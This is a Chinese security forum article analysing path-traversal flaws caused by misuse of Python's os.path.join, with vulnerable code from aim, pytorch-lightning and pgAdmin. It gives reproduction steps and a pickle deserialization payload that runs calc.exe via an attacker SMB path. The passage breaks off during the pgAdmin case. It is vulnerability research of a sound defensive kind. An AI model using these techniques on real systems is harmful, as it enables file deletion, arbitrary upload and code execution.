---
title: 一些由于os.path.join使用不当造成的漏洞
url: https://forum.butian.net/share/4128
source: 奇安信攻防社区
date: 2025-02-13
fetch_date: 2025-10-06T20:32:29.373358
---

# 一些由于os.path.join使用不当造成的漏洞

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 一些由于os.path.join使用不当造成的漏洞

* [渗透测试](https://forum.butian.net/topic/47)

`os.path.join` 是 Python 标准库 `os.path` 模块中的一个函数，用于将多个路径组件组合成一个路径字符串，并根据操作系统的路径规则处理路径分隔符。它是编写跨平台文件路径处理代码的关键工具。但如果开发者对该函数了解不完全，且参数用户可控时，就会造成一些安全问题

`os.path.join` 是 Python 标准库 `os.path` 模块中的一个函数，用于将多个路径组件组合成一个路径字符串，并根据操作系统的路径规则处理路径分隔符。它是编写跨平台文件路径处理代码的关键工具。但如果开发者对该函数了解不完全，且参数用户可控时，就会造成一些安全问题
1. os.path.join的常见用法
====================
`os.path.join(path, \*paths)` 官方文档介绍：
> 智能地合并一个或多个路径部分。 返回值将是 \*path\* 和所有 \\*\*paths\* 成员的拼接，其中每个非空部分后面都紧跟一个目录分隔符，最后一个除外。 也就是说，如果最后一个部分为空或是以一个分隔符结束则结果将仅以一个分隔符结束。 如果某个部分为绝对路径（在 Windows 上需要同时有驱动器号和根路径符号），则之前的所有部分会被忽略并从该绝对路径部分开始拼接。
### \*\*主要功能\*\*
1. \*\*自动处理路径分隔符\*\*
根据当前操作系统，自动使用正确的路径分隔符：
- 在 Windows 上，使用 `\` 作为路径分隔符。
- 在类 Unix 系统（Linux、macOS）上，使用 `/`。
例如：
```python
# 拼接多个路径段,可能造成路径穿越
base\_dir = Path.home() # 获取当前用户的主目录
sub\_dir = "../user2"
# sub\_dir2 = "..\\user2"
file\_name = "file.txt"
full\_path = os.path.join(base\_dir, sub\_dir, file\_name)
print(full\_path)
# sub\_dir输出 (Linux/Mac): /home/user/../user2/file.txt
## sub\_dir2输出 (Windows): C:\\Users\\user\\..\\user2\\file.txt
```
2. \*\*忽略多余的分隔符\*\*
如果某个路径组件以分隔符开头，`os.path.join` 会将之前的路径部分视为无效，从该组件重新计算路径。 由于该方法的返回值将是 \*path\* 和所有 \\*\*paths\* 成员的拼接，所以该方法是多参数的，只要后面多个参数中的其中一个为绝对路径，就会舍弃该绝对路径前面的所有路径
例如：
```python
base\_dir = "/home/user/"
sub\_dir = "/documents"
file\_name = "file.txt"
full\_path = os.path.join(base\_dir, sub\_dir, file\_name)
print(full\_path)
# 输出: /documents/file.txt
base\_dir = r"D:\home\user"
sub\_dir = r"C:\documents"
file\_name = "file.txt"
full\_path = os.path.join(base\_dir, sub\_dir, file\_name)
print(full\_path)
# 输出: C:\documents\file.txt
```
3. \*\*跨平台兼容\*\*
编写代码时无需手动判断路径格式，`os.path.join` 自动适配平台。
例如：
```python
base\_dir = Path.home() # 获取当前用户的主目录
sub\_dir = "projects"
file\_name = "main.py"
full\_path = os.path.join(base\_dir, sub\_dir, file\_name)
print(full\_path)
# 输出 (Linux/Mac): /home/username/projects/main.py
# 输出 (Windows): C:\Users\username\projects\main.py
```
2. os.path.join使用不当引起的漏洞
========================
通过上面的例子我们知道，虽然`os.path.join`方便开发者实现跨平台兼容，但如果第二个之后的参数可控，就会导致突破路径范围限制。接下来会通过几个实际的案例展示其危害。
（1）aim（&lt;=3.19.3）任意文件删除
-------------------------
在下面的代码中，请求访问`/delete-batch/`这个路由后，访问`repo.delete\_runs(runs\_batch)`方法
```python
@runs\_router.post('/delete-batch/')
async def delete\_runs\_batch\_api(runs\_batch: RunsBatchIn):
repo = get\_project\_repo()
success, remaining\_runs = repo.delete\_runs(runs\_batch)
if not success:
raise HTTPException(status\_code=400, detail={
'message': 'Error while deleting runs.',
'detail': {
'Remaining runs id': remaining\_runs
}
})
return {
'status': 'OK'
}
```
经过一系列跳转，最后到达`\_delete\_run`方法，其中`run\_hash`是通过post传递的json格式的list，在下面使用`os.path.join`的拼接，最后通过`os.remove(meta\_path)`删除文件，其中`os.path.join`的最后一个参数可控，所以可以达到文件删除。
```python
def \_delete\_run(self, run\_hash):
...
sub\_dirs = ('chunks', 'progress', 'locks')
for sub\_dir in sub\_dirs:
meta\_path = os.path.join(self.path, 'meta', sub\_dir, run\_hash) # 漏洞点
if os.path.isfile(meta\_path):
os.remove(meta\_path)
else:
shutil.rmtree(meta\_path, ignore\_errors=True)
seqs\_path = os.path.join(self.path, 'seqs', sub\_dir, run\_hash) # 漏洞点
if os.path.isfile(seqs\_path):
os.remove(seqs\_path)
else:
shutil.rmtree(seqs\_path, ignore\_errors=True)
```
\*\*漏洞复现\*\*
首先创建一个文件
![image-20241216151946002](https://oss-yg-cztt.yun.qianxin.com/butian-public/f49c06ed1961153ef0d0c4a7442ae99d3.png)
发包，显示ok即成功删除
![image-20250113155420085](https://oss-yg-cztt.yun.qianxin.com/butian-public/f145a572268d03c1eb754de5849bbb59a.png)
验证
![image-20241216152026026](https://oss-yg-cztt.yun.qianxin.com/butian-public/ffb3665a51ebb29231d9dfbeb6b8099ae.png)
（2）pytorch-lightning（&lt;=2.3.2）文件上传漏洞
--------------------------------------
在下面代码中用 FastAPI 编写的一个文件上传接口的实现，使用put请求方法请求`/api/v1/upload\_file/文件名`的方式上传文件，然后获取临时目录，并在之后使用`os.path.join`将临时目录和文件名进行拼接，将文件保存在临时目录下。
```python
@fastapi\_service.put("/api/v1/upload\_file/{filename}")
async def upload\_file(response: Response, filename: str, uploaded\_file: UploadFile = File(...)) -> Union[str, dict]:
if not ENABLE\_UPLOAD\_ENDPOINT:
response.status\_code = status.HTTP\_405\_METHOD\_NOT\_ALLOWED
return {"status": "failure", "reason": "This endpoint is disabled."}
with TemporaryDirectory() as tmp:
drive = Drive(
"lit://uploaded\_files",
component\_name="file\_server",
allow\_duplicates=True,
root\_folder=tmp,
)
tmp\_file = os.path.join(tmp, filename) # 漏洞点
with open(tmp\_file, "wb") as f:
done = False
while not done:
# Note: The 8192 number doesn't have a strong reason.
content = await uploaded\_file.read(8192)
f.write(content)
done = content == b""
with \_context(str(ComponentContext.WORK)):
drive.put(filename)
return f"Successfully uploaded '{filename}' to the Drive"
```
由于这里的文件名获取是在url处，所以无法通过常规的目录穿越（因为../../会被当作url路径从而解析到其他路由上面）。但由于在Windows下，路径的分隔符是`\`反斜杠，并且允许在 URL 段中使用。
在下面的`os.path.join`中对路径进行拼接时，由于第二个参数时文件名可控的，所以我们可以使用\*\*绝对路径\*\*从而可以忽略前面的路径，将文件上传到Windows主机上的任何路径。
\*\*漏洞复现\*\*
![image-20241212163044114](https://oss-yg-cztt.yun.qianxin.com/butian-public/fa7eed913f49a77e6042cf529d7b42646.png)
当然也可以使用`..\..\`（反斜杠）的方式进行目录穿越上传文件
![image-20241212163232982](https://oss-yg-cztt.yun.qianxin.com/butian-public/f7c16c17bf9896cf2ee3552b3bbc051cc.png)
（3）pgAdmin（&lt;=8.3）反序列化远程代码执行
------------------------------
在下面的代码中，fname使用`os.path.join`方法 拼接 `self.path` 和 `sid`，生成存储会话数据的文件路径。如果存在该文件，则会对该文件进行反序列化得到当前session的相关信息，如果 `data` 为 `None`（说明加载数据失败或文件为空），则会调用 `self.new\_session()` 创建新的会话对象。
```python
from pickle import dump, load
def get(self, sid, digest):
fname = os.path.join(self.path, sid) # 漏洞点
data = None
hmac\_digest = None
randval = None
if os.path.exists(fname):
try:
with open(fname, 'rb') as f:
randval, hmac\_digest, data = load(f) # 反序列化点
except Exception:
pass
if not data:
return self.new\_session()
```
所以如果这里的`sid`可控，且能够上传文件，那么我们就可以通过\*\*路径穿越\*\*的方式获取到该文件，再配合下面的反序列化造成RCE。
通过向上追溯，最终确定sid是由`cookie\_val`通过`!`分割获取的，而`cookie\_val`是通过app.config\['SESSION\\_COOKIE\\_NAME'\]`中获取的
```python
def open\_session(self, app, request):
cookie\_val = request.cookies.get(app.config['SESSION\_COOKIE\_NAME']) # 用户可控点
if not cookie\_val or '!' not in cookie\_val:
return self.manager.new\_session()
sid, digest = cookie\_val.split('!', 1)
if self.manager.exists(sid):
return self.manager.get(sid, digest)
return self.manager.new\_session()
```
在config中定义了`SESSION\_COOKIE\_NAME`为`pga4\_session`，由于cookie中的pga4\\_session是可控的，所以sid也是可控的。
![image-20241211160123638](https://oss-yg-cztt.yun.qianxin.com/butian-public/f21e123117e716c251f3bb7a85805410c.png)
接下来就是寻找上传的地方
- 对于部署在\*\*windows\*\*系统的应用
对于windows来说，默认是支持smb协议的，`os.path.join`在处理smb路径时，同样会将它看作绝对路径，会舍弃掉前面的路径，直接访问smb服务器的文件，例如`\\192.168.1.100\Documents\file.txt`，可以指定攻击者的任意文件。
\*\*复现步骤\*\*
生成payload（python反序列化详细请看我之前的文章）
```python
import pickle
import os
class Exploit:
def \_\_reduce\_\_(self):
return (os.system, ('calc.exe',))
payload = pickle.dumps(Exploit())
with open('payload.pkl', 'wb') as f:
f.write(payload)
print("success")
```
使用自己的windows开启smb服务（linux也可以使用第三方工具开启smb服务）
![image-20241213135231543](https://oss-yg-cztt.yun.qianxin.com/butian-public/f4dffab2bb09b4a1420c0622ad949c88f.png)
将前面生成的payload放在路径下，用其他机器测试可以正常访问
![image-20241213135125154](https://oss-yg-cztt.yun.qianxin.com/butian-public/f98dc617970dd68c73a98271a5116d268.png)
然后将cookie的pga4\\_session值设置为`\\19...